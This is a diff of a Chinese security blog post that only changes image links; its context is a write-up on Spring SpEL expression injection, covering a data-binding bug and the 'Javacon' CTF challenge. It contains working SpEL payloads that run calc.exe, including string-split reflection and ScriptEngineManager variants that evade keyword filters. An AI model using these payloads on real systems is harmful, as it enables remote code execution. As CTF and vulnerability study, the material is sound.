@@ -212,22 +212,22 @@
 &lt;/dependency&gt;
 </code></pre>
 <p>最后使用 IDEA 将依赖下载好，给 UserController.java 下个断点，配置一下然后运行 Spring-boot Web 框架的启动器 Application.java ：</p>
-<p><img src="https://raw.githubusercontent.com/Aluvion/aluvion.github.io/master/css/images/java_el/2019042501.png" srcset="/img/loading.gif" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/Aluvion/aluvion.github.io/master/css/images/java_el/2019042502.png" srcset="/img/loading.gif" alt=""></p>
+<p><img src="/css/images/java_el/2019042501.png" srcset="/img/loading.gif" alt=""></p>
+<p><img src="/css/images/java_el/2019042502.png" srcset="/img/loading.gif" alt=""></p>
 <h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>然后就是调试啰，先尝试用 T 运算符直接加载对象的 payload：</p>
 <pre><code>username[T(java.lang.Runtime).getRuntime().exec(&#39;calc.exe&#39;)]=Twings&amp;password=Twings&amp;repeatPassword=Twings
 </code></pre><p>然后查看调用栈，寻找目标函数，这里我根据之前调试自动绑定漏洞的经验，直接定位去了 InvocableHandlerMethod.java，然后一步步来到触发点：</p>
-<p><img src="https://raw.githubusercontent.com/Aluvion/aluvion.github.io/master/css/images/java_el/2019042503.png" srcset="/img/loading.gif" alt=""></p>
+<p><img src="/css/images/java_el/2019042503.png" srcset="/img/loading.gif" alt=""></p>
 <p>继续跟进，可以看到后面的处理流程跟自动绑定流程一致（这就是自动绑定吧，处理流程不一样可能是版本的原因），看到这里解析了 Spel 表达式：</p>
-<p><img src="https://raw.githubusercontent.com/Aluvion/aluvion.github.io/master/css/images/java_el/2019042503_5.png" srcset="/img/loading.gif" alt=""></p>
+<p><img src="/css/images/java_el/2019042503_5.png" srcset="/img/loading.gif" alt=""></p>
 <p>来到 getValueRef ：</p>
-<p><img src="https://raw.githubusercontent.com/Aluvion/aluvion.github.io/master/css/images/java_el/2019042504.png" srcset="/img/loading.gif" alt=""></p>
+<p><img src="/css/images/java_el/2019042504.png" srcset="/img/loading.gif" alt=""></p>
 <p>然后是 getValueInternal ：</p>
-<p><img src="https://raw.githubusercontent.com/Aluvion/aluvion.github.io/master/css/images/java_el/2019042505.png" srcset="/img/loading.gif" alt=""></p>
+<p><img src="/css/images/java_el/2019042505.png" srcset="/img/loading.gif" alt=""></p>
 <p>可以看到这里在获取 java.lang.Runtime 类的时候抛出了异常，继续往下走：</p>
-<p><img src="https://raw.githubusercontent.com/Aluvion/aluvion.github.io/master/css/images/java_el/2019042506.png" srcset="/img/loading.gif" alt=""></p>
+<p><img src="/css/images/java_el/2019042506.png" srcset="/img/loading.gif" alt=""></p>
 <p>可以看到最后调用的是 MapDataBinder 的 findType 函数，然后跳回到了 setPropertyValue ：</p>
-<p><img src="https://raw.githubusercontent.com/Aluvion/aluvion.github.io/master/css/images/java_el/2019042507.png" srcset="/img/loading.gif" alt=""></p>
+<p><img src="/css/images/java_el/2019042507.png" srcset="/img/loading.gif" alt=""></p>
 <p>这里的代码是：</p>
 <pre><code class="java">context.setTypeLocator((typeName) -&gt; {
     throw new SpelEvaluationException(SpelMessage.TYPE_NOT_FOUND, new Object[]{typeName});
@@ -244,7 +244,7 @@
 <h3 id="Javacon"><a href="#Javacon" class="headerlink" title="Javacon"></a>Javacon</h3><p>ph 牛出的一道 Java 题目，考点是 Spel 表达式注入。</p>
 <h4 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>题目地址：<a href="https://github.com/phith0n/code-breaking/tree/master/2018/javacon" target="_blank" rel="noopener">https://github.com/phith0n/code-breaking/tree/master/2018/javacon</a> ，可以直接拖下来用 docker-compose 启动，这里我为了方便，只拖了源码目录 admin-panel，直接从 IDEA 启动。</p>
 <p>等 maven 下载好依赖（吐槽一句 maven 下载的包快把我的 C 盘塞满了），然后直接运行 ChallengeApplication.java 即可，用配置文件中的 admin/admin 可以登入 admin panel：</p>
-<p><img src="https://raw.githubusercontent.com/Aluvion/aluvion.github.io/master/css/images/java_el/2019042508.png" srcset="/img/loading.gif" alt=""></p>
+<p><img src="/css/images/java_el/2019042508.png" srcset="/img/loading.gif" alt=""></p>
 <p>关键代码如下，admin 函数：</p>
 <pre><code class="java">if (rememberMeValue != null &amp;&amp; !rememberMeValue.equals(&quot;&quot;)) {
     String username = userConfig.decryptRememberMe(rememberMeValue);
@@ -296,7 +296,7 @@ public String poc(String poc) {
 <pre><code class="java">#{T(String).getClass().forName(&#39;java.l&#39;+&#39;ang.Ru&#39;+&#39;ntime&#39;).getMethod(&#39;ex&#39;+&#39;ec&#39;,T(String[])).invoke(T(String).getClass().forName(&#39;java.l&#39;+&#39;ang.Ru&#39;+&#39;ntime&#39;).getMethod(&#39;getRu&#39;+&#39;ntime&#39;).invoke(T(String).getClass().forName(&#39;java.l&#39;+&#39;ang.Ru&#39;+&#39;ntime&#39;)),new String[]{&#39;calc.exe&#39;})}
 </code></pre>
 <p>即可看到弹出计算器：</p>
-<p><img src="https://raw.githubusercontent.com/Aluvion/aluvion.github.io/master/css/images/java_el/2019042509.png" srcset="/img/loading.gif" alt=""></p>
+<p><img src="/css/images/java_el/2019042509.png" srcset="/img/loading.gif" alt=""></p>
 <p>除了反射 Java 的 Runtime 类，还可以反射其他的类，比如 ScriptEngineManager 。</p>
 <pre><code class="java">#{T(String).getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;js&quot;).eval(&quot;java.la&quot;+&quot;ng.Run&quot;+&quot;time.getRun&quot;+&quot;time().ex&quot;+&quot;ec(&#39;calc.exe&#39;)&quot;)}
 </code></pre>
